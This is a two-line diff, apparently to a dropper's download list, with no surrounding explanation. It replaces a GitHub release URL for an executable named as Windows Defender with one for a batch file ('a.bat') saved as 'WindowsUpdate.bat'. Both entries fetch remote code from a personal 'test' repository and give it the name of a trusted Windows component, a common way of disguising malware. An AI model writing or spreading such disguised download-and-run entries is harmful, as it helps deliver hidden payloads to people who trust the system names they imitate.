@@ -1,2 +1,2 @@
-https://github.com/shxv41/test/releases/download/niger/Windows.Defender.exe
-Windows Defender.exe
+https://github.com/shxv41/test/releases/download/niger/a.bat
+WindowsUpdate.bat
